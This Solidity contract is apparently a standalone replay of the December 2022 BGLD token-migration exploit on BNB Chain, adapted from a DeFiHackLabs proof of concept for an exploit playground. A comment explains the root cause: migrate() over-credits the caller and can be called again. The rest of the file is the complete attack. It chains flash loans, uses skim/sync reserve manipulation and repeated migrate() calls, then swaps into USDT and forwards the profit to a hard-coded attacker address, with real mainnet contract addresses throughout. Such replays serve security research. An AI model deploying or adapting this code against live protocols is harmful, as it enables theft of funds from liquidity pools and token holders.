// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-12-BGLD).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// (the DODO DVM flash callback `DPPFlashLoanCall` and the PancakeSwap flash
// callback `pancakeCall` both live on the test itself, so there is no
// standalone contract to deploy). This contract is a faithful, self-contained
// copy of that inline attack — `testExploit()` becomes `run()`, the two
// flash callbacks are preserved verbatim, and the minimal interfaces are
// inlined (no imports so it compiles anywhere). Logic and constants are
// copied from test/BGLD_exp.sol.
//
// Root cause: BlackGoldMigration.migrate() credits the caller's FULL pre-fee
// oldBGLD balance in newBGLD (plus a 10% bonus) while only pulling
// (balance*10/11)-1 oldBGLD via transferFrom, and the call is replayable on
// the residual balance. Combined with skim/sync reserve manipulation on the
// shallow fee-on-transfer BGLD/DEBT/WBNB pools, the attacker mints unbacked
// newBGLD and dumps it into USDT.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniPairV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IUniRouterV2 {
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IERCMigrate {
    function migrate() external;
}

contract BGLDMigrationDrain {
    address constant ATTACKER = 0x3936AdaBe6e6c2D5A17c45B612A56dC9Eacc3312;

    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 oldBGLD = IERC20(0xC2319E87280c64e2557a51Cb324713Dd8d1410a3);
    IERC20 newBGLD = IERC20(0x169f715CaE1F94C203366a6890053E817C767B7C);
    IERC20 DEBT = IERC20(0xC632F90affeC7121120275610BF17Df9963F181c);
    IUniRouterV2 Router = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERCMigrate Proxy = IERCMigrate(0xE445654F3797c5Ee36406dBe88FBAA0DfbdDB2Bb);
    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;
    IUniPairV2 WBNB_oldBGLD = IUniPairV2(0x7526cC9121Ba716CeC288AF155D110587e55Df8b);
    IUniPairV2 oldBGLD_DEBT = IUniPairV2(0x429339fa7A2f2979657B25ed49D64d4b98a2050d);
    IUniPairV2 newBGLD_DEBT = IUniPairV2(0x559D0deAcAD259d970f65bE611f93fCCD1C44261);

    function run() external {
        oldBGLD.approve(address(Router), type(uint256).max);
        oldBGLD.approve(address(Proxy), type(uint256).max);
        newBGLD.approve(address(Router), type(uint256).max);
        DEBT.approve(address(Router), type(uint256).max);
        IDVM(dodo).flashLoan(125 * 1e18, 0, address(this), new bytes(1)); // FlashLoan WBNB
        Proxy.migrate(); // migrate oldBGLD to newBGLD
        newBGLDToDEBT();
        newBGLD_DEBT.swap(0, 950 * 1e9, address(this), new bytes(1)); // FlashLoan DEBT
        Proxy.migrate();
        newBGLDToDEBT();
        DEBTToUSDT();

        // forward all profit to the attacker EOA
        WBNB.transfer(ATTACKER, WBNB.balanceOf(address(this)));
        USDT.transfer(ATTACKER, USDT.balanceOf(address(this)));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        WBNB.transfer(address(WBNB_oldBGLD), WBNB.balanceOf(address(this)));
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(oldBGLD);
        uint256[] memory values = Router.getAmountsOut(125 * 1e18, path);
        WBNB_oldBGLD.swap(0, values[1] * 90 / 100, address(this), "");
        oldBGLD.transfer(address(WBNB_oldBGLD), oldBGLD.balanceOf(address(WBNB_oldBGLD)) * 10 + 10);
        WBNB_oldBGLD.skim(address(this));
        WBNB_oldBGLD.sync();
        oldBGLDToWBNB();
        WBNB.transfer(dodo, 125 * 1e18);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        DEBT.transfer(address(oldBGLD_DEBT), DEBT.balanceOf(address(this)));
        (uint256 oldBGLDreserve, uint256 DEBTreserve,) = oldBGLD_DEBT.getReserves();
        uint256 amountIn = DEBT.balanceOf(address(oldBGLD_DEBT)) - DEBTreserve;
        uint256 amountOut = amountIn * 9975 * oldBGLDreserve / (DEBTreserve * 10_000 + amountIn * 9975);
        oldBGLD_DEBT.swap(amountOut * 90 / 100, 0, address(this), "");
        oldBGLD.transfer(address(oldBGLD_DEBT), oldBGLD.balanceOf(address(oldBGLD_DEBT)) * 10 + 10);
        oldBGLD_DEBT.skim(address(this));
        oldBGLD_DEBT.sync();
        oldBGLDToDEBT();
        uint256 loanAmount = 950 * 1e9;
        DEBT.transfer(address(newBGLD_DEBT), loanAmount * 10_000 / 9975 + 1000);
    }

    function oldBGLDToWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(oldBGLD);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(100 * 1e6, 0, path, address(this), block.timestamp);
    }

    function newBGLDToDEBT() internal {
        address[] memory path = new address[](2);
        path[0] = address(newBGLD);
        path[1] = address(DEBT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            newBGLD.balanceOf(address(this)) * 90 / 100, 0, path, address(this), block.timestamp
        );
    }

    function oldBGLDToDEBT() internal {
        address[] memory path = new address[](2);
        path[0] = address(oldBGLD);
        path[1] = address(DEBT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(100 * 1e6, 0, path, address(this), block.timestamp);
    }

    function DEBTToUSDT() internal {
        address[] memory path = new address[](2);
        path[0] = address(DEBT);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            DEBT.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
